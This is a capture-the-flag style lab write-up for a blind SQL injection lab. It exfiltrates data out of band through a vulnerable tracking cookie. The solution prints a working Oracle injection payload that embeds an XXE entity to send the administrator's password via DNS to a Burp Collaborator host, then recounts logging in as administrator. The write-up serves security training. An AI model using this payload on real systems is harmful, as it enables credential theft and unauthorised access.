## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/235475304-83ec97d9-8d66-468f-9987-1d10093b072b.png)


## Solution :

Cheatsheet to exfiltrate data using OAST technique,

![image](https://user-images.githubusercontent.com/67383098/235475545-7e0c4eb8-4c6e-41d1-8ce3-e14a21837edc.png)

We don't know which db we are dealing with here, so we use each command to find which version od db it is & exfiltrate data.

Captured request look like this,

![image](https://user-images.githubusercontent.com/67383098/235475811-9257d816-28c5-4642-8769-a7602364542e.png)

The query looks something like this ,

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 

Open Collaborator client and copy the DNS server name to clipboard.

![image](https://user-images.githubusercontent.com/67383098/235476323-74407d28-bbd7-446c-90c5-0bf3f677af7d.png)


Use the payload 

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.lazmp4d5y0qtjw8xusp7kc4i0960up.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

So the entire query which will be made will be like ,

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.lazmp4d5y0qtjw8xusp7kc4i0960up.oastify.com/"> %remote;]>'),'/l') FROM dual--
```


Once we get a `200 OK` response click `Poll now` and we get 4 DNS request which were made to our server.

![image](https://user-images.githubusercontent.com/67383098/235477045-3976e21b-30f1-4172-8e7e-894ebd959554.png)

Open one of the requests & we get the password of the user admin - `3eqpnz5t53o1en19b4qi`

Now we can log in as administrator using the passwrod which we got,

![image](https://user-images.githubusercontent.com/67383098/235477465-fee54da3-d819-42cc-94e1-99f77adb399f.png)
